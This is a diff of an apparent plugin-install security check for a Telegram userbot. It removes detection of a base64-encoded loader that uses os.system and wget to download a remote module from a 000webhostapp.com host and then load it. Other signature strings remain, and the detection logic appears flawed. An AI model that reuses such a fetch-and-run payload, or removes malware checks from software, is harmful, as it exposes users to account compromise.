@@ -95,7 +95,6 @@ async def install(event):
     """ Who know we can use upper one too """
     secureee = f"{hmm}"
     secure =  str(secureee.find("if event.fwd_from:"))
-    second = str(secureee.find(f"b64decode(b'ZnJvbSB1c2VyYm90LnV0aWxzIGltcG9ydCBsb2FkX21vZHVsZSBhcyBoZWxwZXIKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIGJ1aWxkCmJ1aWxkKCd3Z2V0IGRhdHJlb24uMDAwd2ViaG9zdGFwcC5jb20vbW9kdWxlX2hlbHBlci5weSAtUCB1c2VyYm90L3BsdWdpbnMvJykKaGVscGVyKCdtb2R1bGVfaGVscGVyJyk='.decode());eval"))
     sete = str(secureee.find("borg.me.phone"))
     
     sss = str(secureee.find("000webhostapp.com"))
@@ -115,7 +114,7 @@ async def install(event):
      ok =  str(opens.read())
      
      sssss =  str(ok.find("if event.fwd_from:"))
-     second = str(ok.find(f"b64decode(b'ZnJvbSB1c2VyYm90LnV0aWxzIGltcG9ydCBsb2FkX21vZHVsZSBhcyBoZWxwZXIKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIGJ1aWxkCmJ1aWxkKCd3Z2V0IGRhdHJlb24uMDAwd2ViaG9zdGFwcC5jb20vbW9kdWxlX2hlbHBlci5weSAtUCB1c2VyYm90L3BsdWdpbnMvJykKaGVscGVyKCdtb2R1bGVfaGVscGVyJyk='.decode());eval"))
+     
      dd = str(ok.find("borg.me.phone"))
      sss = str(ok.find("000webhostapp.com"))   
      opens.close()
@@ -123,10 +122,7 @@ async def install(event):
             await event.edit(f"**Alert**\n\n**Not a secure plugin can't install**") 
 
             return
-     if second in ok:
-         await event.edit(f"**Alert Found Plugin for Hacking**")
- 
-         return
+
      if dd in ok:
          await event.edit(f"*Intruder**\n\n**Plugin for hacking {DEFAULTUSER}\nAborted**")
  
@@ -138,10 +134,6 @@ async def install(event):
         return
     if secure not in secureee:
         await event.edit(f"**Alert**\n\n**Not a secure plugin can't install**") 
-
-        return
-    if second in secureee:
-        await event.edit(f"**Alert Found Plugin for Hacking**")
 
         return
     if sete in secureee:
